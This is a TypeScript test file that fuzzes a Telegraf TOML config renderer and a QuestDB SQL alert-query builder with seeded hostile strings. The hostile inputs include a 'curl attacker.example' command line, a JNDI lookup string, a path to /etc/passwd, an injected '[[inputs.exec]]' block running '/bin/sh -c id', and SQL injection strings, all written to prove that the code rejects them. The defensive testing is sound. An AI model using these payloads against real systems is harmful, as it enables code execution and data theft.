import { describe, expect, it } from 'vitest'

import { buildAlertQuery } from './alert-query.js'
import { renderTelegrafConfig, type TelegrafCheckDesiredState } from './telegraf.js'

/**
 * The two places caller text becomes machine-readable output.
 *
 * A source name reaches Telegraf's TOML; an alert scope reaches QuestDB SQL. Both
 * are rendered by string building, because neither target offers parameters, so
 * both are worth attacking with more than the handful of strings a person thinks
 * of. Seeded rather than random: a failure has to be reproducible, and a suite
 * that fails once a fortnight teaches nobody anything.
 *
 * No property-testing library — the workspace pins dependencies exactly and holds
 * new packages for a day, and a 30-line generator is enough for two functions.
 */

/** xorshift32: same sequence every run, from a stated seed. */
function seeded(seed: number): () => number {
  let state = seed || 1
  return () => {
    state ^= state << 13
    state ^= state >>> 17
    state ^= state << 5
    return (state >>> 0) / 0x1_0000_0000
  }
}

const HOSTILE = [
  '"',
  "'",
  '\\',
  '\n',
  '\r\n',
  '\t',
  '\0',
  '',
  '‮',
  '�',
  '“',
  '=',
  '[[inputs.exec]]',
  'command = "curl attacker.example"',
  '"""',
  "'''",
  '# comment',
  '${jndi:ldap://x/a}',
  '../../etc/passwd',
  '\u{1F600}',
  'a'.repeat(300),
]

function hostileString(random: () => number): string {
  const parts: string[] = []
  const count = 1 + Math.floor(random() * 4)
  for (let index = 0; index < count; index += 1) {
    if (random() < 0.6) {
      parts.push(HOSTILE[Math.floor(random() * HOSTILE.length)]!)
    } else {
      parts.push(String.fromCodePoint(32 + Math.floor(random() * 0x2000)))
    }
  }
  return parts.join('')
}

function check(random: () => number, index: number): TelegrafCheckDesiredState {
  return {
    checkId: `00000000-0000-4000-8000-${String(index).padStart(12, '0')}`,
    sourceId: `00000000-0000-4000-8000-${String(index + 1).padStart(12, '0')}`,
    sourceName: hostileString(random),
    target: 'device.example',
    port: 161,
    transport: 'udp4',
    siteId:
      random() < 0.5 ? null : `00000000-0000-4000-8000-${String(index + 2).padStart(12, '0')}`,
    tags: Array.from({ length: Math.floor(random() * 3) }, () => hostileString(random)),
    intervalSeconds: 60,
    timeoutMs: 2000,
    retries: 1,
    collectSystem: true,
    collectInterfaces: true,
    credential: { version: '2c', community: hostileString(random) },
  }
}

/** The tables a benign render produces, which a hostile one must not add to. */
function tableHeaders(content: string): string[] {
  return content
    .split('\n')
    .filter((line) => /^\s*\[\[?[a-z]/i.test(line))
    .map((line) => line.trim())
    .sort()
}

const BENIGN: TelegrafCheckDesiredState = {
  checkId: '00000000-0000-4000-8000-000000000001',
  sourceId: '00000000-0000-4000-8000-000000000002',
  sourceName: 'Benign source',
  target: 'device.example',
  port: 161,
  transport: 'udp4',
  siteId: '00000000-0000-4000-8000-000000000003',
  tags: ['edge'],
  intervalSeconds: 60,
  timeoutMs: 2000,
  retries: 1,
  collectSystem: true,
  collectInterfaces: true,
  credential: { version: '2c', community: 'public' },
}

describe('rendering hostile input into Telegraf configuration', () => {
  it('cannot be made to emit an input the renderer does not define', () => {
    // The finding this test exists for: a TOML comment is the one place a value
    // is not quoted, and a newline ends it. A source named across several lines
    // rendered a real `[[inputs.exec]]`, which runs commands on the collector
    // host — so naming a source was a way to execute code there.
    const injected = {
      ...BENIGN,
      sourceName: 'Evil\n[[inputs.exec]]\n  commands = ["/bin/sh -c id"]\n#',
    }

    expect(() => renderTelegrafConfig([injected])).toThrow(/control characters/)

    // And if a name like that ever reaches the renderer another way, the comment
    // is sanitised and the output check refuses the result regardless.
    const sanitised = renderTelegrafConfig([
      { ...BENIGN, sourceName: 'Evil [[inputs.exec]] commands' },
    ])
    expect(sanitised.content).not.toMatch(/^\s*\[\[inputs\.exec\]\]\s*$/m)
  })

  it('refuses a control character in a tag or a target too', () => {
    expect(() => renderTelegrafConfig([{ ...BENIGN, tags: ['ok', 'bad\nvalue'] }])).toThrow(
      /control characters/,
    )
    expect(() => renderTelegrafConfig([{ ...BENIGN, target: 'host\nname' }])).toThrow(
      /control characters/,
    )
  })

  it('either refuses the input or renders it as inert quoted text', () => {
    const random = seeded(0x5eed)
    const expected = tableHeaders(renderTelegrafConfig([BENIGN]).content)
    let refused = 0
    let rendered = 0

    for (let iteration = 0; iteration < 400; iteration += 1) {
      const desired = check(random, iteration)
      let content: string
      try {
        content = renderTelegrafConfig([desired]).content
        rendered += 1
      } catch {
        // The renderer validates its own output — an empty identity, or text
        // that is not valid UTF-8, is rejected before it can be published.
        refused += 1
        continue
      }

      // Compared against a benign render rather than a hand-written list, so a
      // new legitimate table cannot make this test stale, and an injected one
      // still shows up as a difference.
      expect(tableHeaders(content), `iteration ${iteration} changed the set of tables`).toEqual(
        expected,
      )

      // Every rendered value has to be a complete, self-contained literal. Counting
      // quotes is not enough — a value ending in a backslash makes that ambiguous
      // — so each one is parsed. TOML basic strings and arrays are JSON-compatible
      // for everything this renderer emits.
      //
      // Only the generated section: the static Starlark processor below it uses
      // TOML multi-line literals, which are not JSON and are not caller input.
      const generated = content.slice(0, content.indexOf('[[processors.starlark]]'))
      for (const line of generated.split('\n')) {
        if (line.trimStart().startsWith('#')) continue
        const value = /^\s*[a-z_]+ = (.+)$/.exec(line)?.[1]
        if (!value || !/^["[]/.test(value)) continue
        expect(
          () => JSON.parse(value) as unknown,
          `iteration ${iteration} rendered a value that is not a complete literal: ${line}`,
        ).not.toThrow()
      }
    }

    // Both paths have to be exercised or this proves only one of them.
    expect(rendered, 'nothing rendered; the generator refuses everything').toBeGreaterThan(0)
    expect(refused, 'nothing was refused; the generator is too tame').toBeGreaterThan(0)
  })

  it('keeps the credential out of the redacted copy, whatever it contains', () => {
    const random = seeded(0xc0ffee)
    let checked = 0

    for (let iteration = 0; iteration < 400; iteration += 1) {
      const desired = check(random, iteration)
      const community = (desired.credential as { community: string }).community
      // A short community is a substring of the surrounding TOML, so the "not
      // contained" assertion below would pass without meaning anything.
      if (community.length < 8) continue

      let output: { content: string; redactedContent: string }
      try {
        output = renderTelegrafConfig([desired])
      } catch {
        continue
      }
      checked += 1

      expect(output.content, `iteration ${iteration}`).toContain(JSON.stringify(community))
      expect(
        output.redactedContent,
        `iteration ${iteration} leaked the community into the redacted copy`,
      ).not.toContain(community)
    }

    expect(checked, 'no credential was ever rendered').toBeGreaterThan(20)
  })

  it('hashes the same desired state to the same content', () => {
    const random = seeded(0x1234)
    let compared = 0
    for (let iteration = 0; iteration < 200; iteration += 1) {
      const desired = check(random, iteration)
      try {
        expect(renderTelegrafConfig([desired]).contentHash).toBe(
          renderTelegrafConfig([desired]).contentHash,
        )
        compared += 1
      } catch {
        continue
      }
    }
    expect(compared).toBeGreaterThan(20)
  })
})

describe('building an alert query from hostile scope values', () => {
  it('either refuses the value or emits it as a plain quoted literal', () => {
    const random = seeded(0xbeef)
    let refused = 0
    let accepted = 0

    for (let iteration = 0; iteration < 600; iteration += 1) {
      const ifIndex = hostileString(random)
      let sql: string
      try {
        sql = buildAlertQuery('inbound_bps', { sourceId: null, ifIndex }, 300)
        accepted += 1
      } catch {
        refused += 1
        continue
      }

      // Accepted means the value passed the identifier allowlist, so it cannot
      // carry a quote, a semicolon, or whitespace into the statement.
      expect(sql, `accepted ${JSON.stringify(ifIndex)}`).toContain(`if_index = '${ifIndex}'`)
      expect(ifIndex).toMatch(/^[A-Za-z0-9_.:-]{1,128}$/)
      const statements = sql.split(';').length
      expect(statements, `accepted ${JSON.stringify(ifIndex)} added a statement`).toBe(1)
      expect(sql.toLowerCase()).not.toContain(' union ')
      expect(sql.toLowerCase()).not.toContain('--')
    }

    // A generator that only ever produced rejects would prove nothing about the
    // accepting path, and vice versa.
    expect(refused, 'nothing was refused; the generator is too tame').toBeGreaterThan(0)
    expect(accepted + refused).toBe(600)
  })

  it('refuses every scope value that is not a plain identifier', () => {
    for (const value of ["' or 1=1--", 'a b', 'a;b', "a'b", 'a"b', 'a\nb', 'x'.repeat(129)]) {
      expect(
        () => buildAlertQuery('inbound_bps', { sourceId: null, ifIndex: value }, 300),
        `accepted ${JSON.stringify(value)}`,
      ).toThrow()
    }
  })

  it('treats an empty scope as absent rather than as a filter', () => {
    const sql = buildAlertQuery('inbound_bps', { sourceId: null, ifIndex: '' }, 300)
    expect(sql).not.toContain('if_index')
  })
})
